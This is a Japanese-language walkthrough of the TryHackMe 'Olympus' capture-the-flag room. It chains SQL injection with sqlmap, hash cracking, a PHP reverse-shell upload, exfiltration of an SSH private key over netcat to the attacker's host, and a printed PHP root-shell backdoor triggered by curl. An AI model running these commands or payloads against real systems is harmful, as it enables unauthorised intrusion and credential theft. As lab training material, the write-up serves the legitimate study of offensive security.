# Olympus CTF

https://tryhackme.com/room/olympusroom

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.24.252
root@ip-10-10-247-27:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-23 06:42 BST
Nmap scan report for olympus.thm (10.10.24.252)
Host is up (0.0064s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:63:45:6A:13:CB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.60 seconds
root@ip-10-10-247-27:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-23 06:42 BST
Nmap scan report for olympus.thm (10.10.24.252)
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:63:45:6A:13:CB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
```

SSH, HTTP

```
If support is needed, please contact root@the-it-department. The old version of the website is still accessible on this domain.
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-10-247-27:~# gobuster dir -x=txt,php -u http://olympus.thm -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/~webmaster を発見。

## Victor CMS

http://olympus.thm/~webmaster/ にアクセスしたら、Victor CMS が表示された。

```
Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.

As I remind you, we have a wordlist of forbidden password that you should use.

Please update your passwords.
```

脆弱なパスワードを使用しているユーザーがいるとのこと。  
ただ、root 以外のユーザー名が不明なのが問題。

```shell
$ searchsploit victor
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                       | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                           | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                 | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                             | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                           | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                 | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                              | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                               | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                           | php/webapps/49282.txt
Victory FTP Server 5.0 - Denial of Service                                        | windows/dos/16230.py
---------------------------------------------------------------------------------- ---------------------------------
```

ログインさえできれば、シンプルに PHP アップロードできる可能性が高い。

```shell
$ cat /usr/share/exploitdb/exploits/php/webapps/49310.txt
# Exploit Title: Victor CMS 1.0 - File Upload To RCE
# Date: 20.12.2020
# Exploit Author: Mosaaed
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0

# Tested on: Apache2/Linux

Step1: register http://localhost/CMSsite-master/register.php
step2: login as user
step3: Go to Profile
step4: upload imag as php file (upload shell.php)
step5: update user
step6: You will find your shell in img folder :/path/img/cmd.php

http://localhost/CMSsite-master/img/cmd.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

/~webmaster 内を gobuster

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/admin                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/admin/]
/category.php         (Status: 200) [Size: 6650]
/css                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/css/]
/fonts                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/fonts/]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/img                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/img/]
/includes             (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/includes/]
/index.php            (Status: 200) [Size: 9386]
/js                   (Status: 301) [Size: 318] [--> http://olympus.thm/~webmaster/js/]
/LICENSE              (Status: 200) [Size: 1070]
/search.php           (Status: 200) [Size: 6621]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

### ユーザー名ファジング

- 無効なユーザー名でログインしようとすると 200 応答
- 有効なユーザー名＋無効なパスワードでログインしようとすると、302 応答

つまり、あり得ないパスワードを使い、200 が返ったらそのユーザー名は存在すると考えられる。

```shell
$ ffuf -u http://olympus.thm/~webmaster/includes/login.php -c -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'user_name=FUZZ&user_password=XXXXXXXXXXX&login=' -H 'Cookie: PHPSESSID=25m09ilcbkkt53dst5n2mb8u5j' -H 'Content-Type: application/x-www-form-urlencoded' -fc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://olympus.thm/~webmaster/includes/login.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=25m09ilcbkkt53dst5n2mb8u5j
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : user_name=FUZZ&user_password=XXXXXXXXXXX&login=
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

root                    [Status: 302, Size: 114, Words: 20, Lines: 4, Duration: 336ms]
:: Progress: [10177/10177] :: Job [1/1] :: 153 req/sec :: Duration: [0:01:10] :: Errors: 0 ::
```

root しかヒットしなかった。

### sqlmap

search.php に対して sql インジェクションを試す。

```shell
$ sqlmap -r ./req.txt -p search --dbs

[02:41:35] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
```

olympus DB の全てをダンプ

```shell
$ sqlmap -r ./req.txt -p search -D olympus --dump-all
```

```shell
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

prometheus, zeus ユーザーを発見。

```shell
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{ひみつ} |
+---------------------------+
```

フラグ１発見。

```shell
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
```

```shell
Table: posts
[3 entries]
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| post_id | post_category_id | post_date  | post_tags               | post_image      | post_title           | post_author | post_status | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | post_comment_count |
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| 2       | 1                | 2022-04-22 | first, post             | img.jpg         | Dear Gods and Godess | root        | publish     | <div class="wp-container-7 entry-content wp-block-post-content" style="text-align: center;">\r\n<p><strong>This is the first version of the Olympus website. It should become a platform for each and everyone of you to express their needs and desires. Humans should not be allowed to visit it.</strong></p>\r\n<p><strong>You have all been sent a username and a password (that you will need to change ASAP) that will allow you to join the Olympus and create articles.</strong></p>\r\n<p><strong>I hope you will like this website,</strong></p>\r\n<p><strong>You[02:43:23] [WARNING] writing binary ('application/octet-stream') content to file '/home/kali/.local/share/sqlmap/output/olympus.thm/dump/olympus/post_content-46897257.bin'
| <blank>            |
| 3       | 1                | 2022-04-27 | credentials,security,it | 61X1U2-xUTL.jpg | Credentials          | root        | publish     | <p><strong>Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.</strong></p>\r\n<p><strong>As I remind you, we have a wordlist of forbidden password that you should use. </strong></p>\r\n<p><strong>Please update your passwords.</strong></p>\r\n<p>\xa0</p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>                                                                                                                                                                                                       [02:43:23] [WARNING] writing binary ('application/octet-stream') content to file '/home/kali/.local/share/sqlmap/output/olympus.thm/dump/olympus/post_content-10137618.bin'
| <blank>            |
| 6       | 1                | 2022-05-06 | update                  | <blank>         | Update is comming    | root        | publish     | <p style="text-align: center;"><strong>Dear gods and goddess,</strong><br /><strong>Once more, your IT god snapped his finger and here it goes :</strong><br /><strong>Olympus becomes something else, something bigger, something better.</strong><br /><strong>You will find every instruction, should you need them, here.</strong><br /><br /><strong>HOWEVER, DO NOT FORGET TO UPDATE YOUR E-MAIL ON YOUR ACCOUNT PROFILE.</strong><br /><br /><strong>root@the-it-department</strong> </p>                                                                                                                                                                   | <blank>            |
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
```

```shell
Table: comments
[1 entry]
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| comment_id | comment_post_id | comment_date | comment_email | comment_author | comment_status | comment_content                                                                                                                                                           |
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1          | 2               | 2022-05-03   | <blank>       | prometheus     | approved       | Heyyy ! You've done a damn good but unsecured job ^^\r\n\r\nI've patched a few things on my way, but I managed to hack my self into the olympus !\r\n\r\ncheerio ! \r\n=P |
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

### パスワードクラック

パスワードハッシュを入手できたので、クラック。  
prometheus の Salt がブランクになっていたので、そっちを狙う。

```shell
hashcat -m 3200 hash.txt .\SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt
```

これで prometheus ユーザーのパスワードが判明した。

## ダッシュボード

prometheus でログイン。脆弱性情報に従って、プロフィール画像アップロードを使って PHP をアップロードしたが、アクセスしたら Forbiden になった。

## chat

- root@chat.olympus.thm のメールアドレスに注目して、chat サブドメインを調べる。
- http://chat.olympus.thm にアクセスしたら別のログイン画面。prometheus でログインできた。パスワードは同じ。
- pentest.php をアップロード。DB を見たが、データが追加されてなかったので、アップロード先のファイル名が分からない。

データが追加されていなかったのは、sqlmap がキャッシュを使っているためだった。--flush-session オプションを付けることで追加されたデータを確認できた。

```shell
$ sqlmap -r ./req.txt -p search -D olympus --dump-all --flush-session
```

DB で判明したファイル名を使ってアクセス。  
http://chat.olympus.thm/uploads/d07da652e8773638b3622c8e9673b2e8.php

リバースシェル取得成功。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.79.154] 56826
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 08:08:17 up 59 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
```

```shell
www-data@olympus:/$ cat /home/zeus/user.flag
cat /home/zeus/user.flag
flag{...............................}
```

フラグ２ゲット。

## 権限昇格１

```shell
www-data@olympus:/$ cat /home/zeus/zeus.txt
cat /home/zeus/zeus.txt
Hey zeus !

I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.

                                                - Prometheus.
```

スーパーユーザーの永続化アクセスを手に入れたとのことだが、具体的には分からない。

zeus オーナーのファイル。cputils は SUID が付いている。

```shell
www-data@olympus:/home/zeus$ find / -user zeus -type f -not -path "/proc/*" 2>/dev/null
/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.bashrc
/home/zeus/.profile
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/crash/_usr_bin_cp-utils.1000.crash
```

```shell
www-data@olympus:/home/zeus$ ls -al /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
www-data@olympus:/home/zeus$
www-data@olympus:/home/zeus$ ls -al /var/crash/_usr_bin_cp-utils.1000.crash
-rw-r----- 1 zeus zeus 63991 Apr 14  2022 /var/crash/_usr_bin_cp-utils.1000.crash
```

よく分からないが、ターゲットとして crash ファイルを指定してみた。

```shell
www-data@olympus:/home/zeus$ cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: /var/crash/_usr_bin_cp-utils.1000.crash

Enter the Name of Target File: /tmp/aaa

File copied successfully.
```

zeus の権限でファイルコピーできるらしい。

SSH 秘密鍵をコピー。

```shell
www-data@olympus:/home/zeus$ cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/id_rsa

File copied successfully.
```

ファイル転送

```shell
www-data@olympus:/home/zeus$ nc 10.2.22.182 1234 < /tmp/id_rsa

$ nc -lvnp 1234 > zeus_id_rsa
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.79.154] 50832
```

SSH 接続しようとしたが、パスフレーズが必要だった。

```shell
$ chmod 600 ./zeus_id_rsa

$ ssh zeus@10.10.79.154 -i ./zeus_id_rsa
The authenticity of host '10.10.79.154 (10.10.79.154)' can't be established.
ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.79.154' (ED25519) to the list of known hosts.
Enter passphrase for key './zeus_id_rsa':
```

john でパスフレーズをクラックできた。

```shell
$ ssh2john ./zeus_id_rsa > zeus_hash

$ john ./zeus_hash --wordlist /usr/share/wordlists/rockyou.txt
```

判明したパスフレーズを使い、zeus として SSH 接続成功。

## 権限昇格２

/var/www/html に奇妙なファイルを発見。

```shell
zeus@olympus:/var/www/html$ ls -al 0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
-rwxr-xr-x 1 root zeus 1589 Jul 15  2022 0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php

zeus@olympus:/var/www/html$ cat 0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```

- POST パラメータ「password」
- GET パラメータ「ip」「port」
- これらが同時に指定されていないと、die が実行される。

http://localhost/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php で接続可能

GET と POST のパラメータを同時に送ることに注意して、curl でリクエストを送る。

```shell
zeus@olympus:~$ curl -X POST "http://localhost/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.2.22.182&port=6666" -d "password=a7c5ffcf139742f52a5267c4a0674129"
```

root リバースシェルゲット。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.79.154] 56874
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 09:49:41 up  2:41,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/1    10.2.22.182      08:44   28:53   0.11s  0.11s -bash
zeus     pts/2    10.2.22.182      09:28    0.00s  0.06s  0.00s curl -X POST http://localhost/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.2.22.182&port=6666 -d password=a7c5ffcf139742f52a5267c4a0674129
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)
```

```shell
root@olympus:/# cat /root/root.flag
cat /root/root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{ひみつ}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```

フラグ３ゲット。

## ボーナスフラグ

シンプルに検索したら３つのフラグが出てきた。

```shell
root@olympus:/# find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "flag{" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'
```

コンプリート！

## 振り返り

- 最難関は、chat サブドメインを発見する部分だったと思う。
- sqlmap の --flush-session オプションを知らなかったためハマった。勉強になった。
- GET と POST のパラメータを同時に渡す方法を学べて良かった。
